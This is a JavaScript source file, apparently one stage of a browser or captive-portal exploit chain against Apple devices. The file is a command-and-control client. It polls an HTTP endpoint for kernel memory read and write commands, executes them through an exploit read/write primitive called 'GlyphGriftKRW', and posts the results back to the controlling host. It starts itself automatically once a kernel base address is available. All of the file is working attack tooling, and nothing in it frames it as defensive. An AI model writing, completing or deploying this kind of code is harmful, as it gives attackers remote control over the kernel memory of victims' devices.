/**
 * Captive Portal Kernel R/W HTTP C2 Client — Real Implementation
 * 
 * This replaces the fake Map-based emulator in appleave2_portal_race.js
 * with a real kernel R/W client that uses GlyphGrift's relative R/W primitive.
 * 
 * Flow:
 *   1. Poll GET /api/krw/poll for commands from Mac host
 *   2. Execute real kernel read/write via GlyphGriftKRW
 *   3. POST results to /api/krw/result
 *   4. Repeat until KRW_OP_DONE
 * 
 * Integration:
 *   - Load AFTER glyphgrift_krw.js and glyphgrift_post_trigger.js
 *   - Only activates if GlyphGriftKRW is initialized with valid kbase
 */
(function() {
  'use strict';
  
  var API_POLL = '/api/krw/poll';
  var API_RESULT = '/api/krw/result';
  var gActive = false;
  var gKrwReady = false;
  var gPollCount = 0;
  var gLastCommand = null;
  
  /* Command types matching captive_http.c */
  var KRW_OP_READ64 = 0;
  var KRW_OP_WRITE64 = 1;
  var KRW_OP_DONE = 2;
  
  /**
   * Start the KRW polling loop.
   * Call this after GlyphGriftKRW has been initialized with a valid kbase.
   */
  function startPolling() {
    if (!window.GlyphGriftKRW || !window.GlyphGriftKRW.getState().initialized) {
      log('startPolling failed: GlyphGriftKRW not initialized');
      return false;
    }
    
    var state = window.GlyphGriftKRW.getState();
    if (!state.kbase || state.kbase === 0n) {
      log('startPolling failed: no kbase available');
      return false;
    }
    
    gActive = true;
    gKrwReady = true;
    gPollCount = 0;
    
    log('KRW polling started: kbase=0x' + state.kbase.toString(16));
    pollLoop();
    
    return true;
  }
  
  /**
   * Main polling loop.
   */
  async function pollLoop() {
    while (gActive) {
      try {
        var resp = await fetch(API_POLL, {
          method: 'GET',
          headers: { 'Accept': 'application/json' },
          cache: 'no-store'
        });
        
        if (!resp.ok) {
          await sleep(50);
          continue;
        }
        
        var cmd = await resp.json();
        
        if (!cmd || typeof cmd.op !== 'number') {
          await sleep(50);
          continue;
        }
        
        gPollCount++;
        gLastCommand = cmd;
        
        if (cmd.op === KRW_OP_READ64) {
          handleRead64(cmd);
        } else if (cmd.op === KRW_OP_WRITE64) {
          handleWrite64(cmd);
        } else if (cmd.op === KRW_OP_DONE) {
          log('KRW_OP_DONE received — stopping polling');
          gActive = false;
          await postResult({ id: cmd.id, success: true, done: true });
          break;
        } else {
          log('Unknown command op: ' + cmd.op);
          await postResult({ id: cmd.id, success: false, error: 'unknown_op' });
        }
        
      } catch (e) {
        /* Network error — retry after short delay */
        if (gActive) {
          await sleep(50);
        }
      }
    }
    
    gKrwReady = false;
    log('KRW polling stopped (commands processed: ' + gPollCount + ')');
  }
  
  /**
   * Handle a READ64 command.
   */
  function handleRead64(cmd) {
    if (typeof cmd.addr !== 'bigint') {
      cmd.addr = BigInt(cmd.addr);
    }
    
    /* Calculate offset from kbase */
    var state = window.GlyphGriftKRW.getState();
    var offset = Number(cmd.addr - state.kbase);
    
    /* Read via GlyphGriftKRW */
    var val = window.GlyphGriftKRW.read64(offset);
    
    if (val === null) {
      log('READ64 failed at 0x' + cmd.addr.toString(16) + ' (offset ' + offset + ')');
      postResult({ id: cmd.id, success: false, error: 'read_failed' });
    } else {
      log('READ64 0x' + cmd.addr.toString(16) + ' = 0x' + val.toString(16));
      postResult({ id: cmd.id, success: true, val: val });
    }
  }
  
  /**
   * Handle a WRITE64 command.
   */
  function handleWrite64(cmd) {
    if (typeof cmd.addr !== 'bigint') {
      cmd.addr = BigInt(cmd.addr);
    }
    if (typeof cmd.val !== 'bigint') {
      cmd.val = BigInt(cmd.val);
    }
    
    var state = window.GlyphGriftKRW.getState();
    var offset = Number(cmd.addr - state.kbase);
    
    var ok = window.GlyphGriftKRW.write64(offset, cmd.val);
    
    if (!ok) {
      log('WRITE64 failed at 0x' + cmd.addr.toString(16));
      postResult({ id: cmd.id, success: false, error: 'write_failed' });
    } else {
      log('WRITE64 0x' + cmd.addr.toString(16) + ' = 0x' + cmd.val.toString(16));
      postResult({ id: cmd.id, success: true });
    }
  }
  
  /**
   * Post result to host.
   */
  async function postResult(result) {
    try {
      var resp = await fetch(API_RESULT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(result)
      });
      return resp.ok;
    } catch (e) {
      log('postResult failed: ' + e.message);
      return false;
    }
  }
  
  /**
   * Sleep helper.
   */
  function sleep(ms) {
    return new Promise(function(resolve) { setTimeout(resolve, ms); });
  }
  
  /**
   * Internal logging.
   */
  function log(msg) {
    if (typeof window !== 'undefined' && window.console) {
      console.log('[CaptiveKRW] ' + msg);
    }
  }
  
  /* Export API */
  window.__L0FCK_KRW_START_POLLING = startPolling;
  window.__L0FCK_KRW_IS_READY = function() { return gKrwReady; };
  window.__L0FCK_KRW_GET_STATS = function() {
    return {
      active: gActive,
      ready: gKrwReady,
      pollCount: gPollCount,
      lastCommand: gLastCommand
    };
  };
  
  /* Auto-start if GlyphGriftKRW is already ready */
  if (window.GlyphGriftKRW && window.GlyphGriftKRW.getState().kbase) {
    setTimeout(startPolling, 100);
  }
  
  log('CaptiveKRW client loaded');
})();